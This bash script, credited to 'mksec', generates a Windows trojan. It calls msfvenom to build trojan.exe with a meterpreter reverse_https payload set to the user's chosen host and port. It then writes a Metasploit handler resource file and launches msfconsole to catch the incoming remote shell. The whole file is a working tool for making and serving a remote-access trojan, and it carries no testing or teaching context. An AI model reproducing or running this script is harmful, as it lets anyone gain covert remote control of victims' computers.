lightblue=`tput setaf 14` 
green=`tput setaf 46`     
red=`tput setaf 196`      
yellow=`tput setaf 11`    
purple=`tput setaf 129`   
reset=`tput sgr0` 
clear
echo "${green}This tool was created by 'mksec'."
private_ip=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
read -p "${green}[+]${lightblue}LHOST[Default:$private_ip]-->" ip
read -p "${green}[+]${lightblue}LPORT-->" port
if [[ $ip = "" || $ip = " " ]];then
    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$private_ip LPORT=$port -f exe > trojan.exe
    echo use exploit/multi/handler > Metasploit/trojan.rc
    echo set LHOST $private_ip >> Metasploit/trojan.rc
    echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/trojan.rc
    echo set LPORT $port >> Metasploit/trojan.rc
    echo exploit -j -z >> Metasploit/trojan.rc
    clear
    echo -e "${green}[!]${purple}Trojan information is located in '${yellow}trojan_information.txt' ${purple}folder."
    echo -e "${green}[!]${purple}Trojan was created as '${yellow}trojan.exe' ${purple}in the folder you are in."
    echo -e "${green}[+]Payload:${yellow} windows/meterpreter/reverse_https"
    echo -e "${green}[+]Exploit:${yellow} exploit/multi/handler"
    echo -e "${green}[+]IP:${yellow} $private_ip"
    echo -e "${green}[+]Port:${yellow} $port"
    echo "windows/meterpreter/reverse_https" > trojan_information.txt
    echo "exploit/multi/handler" >> trojan_information.txt
    echo $private_ip >> trojan_information.txt
    echo $port >> trojan_information.txt
else
    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > trojan.exe
    echo use exploit/multi/handler > Metasploit/trojan.rc
    echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/trojan.rc
    echo set LHOST $ip >> Metasploit/trojan.rc
    echo set LPORT $port >> Metasploit/trojan.rc
    echo exploit -j -z >> Metasploit/trojan.rc
    clear
    echo -e "${green}[!]${purple}Trojan information is located in '${yellow}trojan_information.txt' ${purple}folder."
    echo -e "${green}[!]${purple}Trojan was created as '${yellow}trojan.exe' ${purple}in the folder you are in."
    echo -e "${green}[+]Payload: ${yellow} windows/meterpreter/reverse_https"
    echo -e "${green}[+]Exploit: ${yellow} exploit/multi/handler"
    echo -e "${green}[+]IP: ${yellow} $ip"
    echo -e "${green}[+]Port: ${yellow} $port"
    echo "windows/meterpreter/reverse_https" > trojan_information.txt
    echo "exploit/multi/handler" >> trojan_information.txt
    echo $ip >> trojan_information.txt
    echo $port >> trojan_information.txt
fi
echo -e "${green}[!]Opening Metasploit Framework..."
echo -e "${green}[!]If you get the "Handler Session Error" , change the Port number and run the program again."
sudo msfconsole -r Metasploit/trojan.rc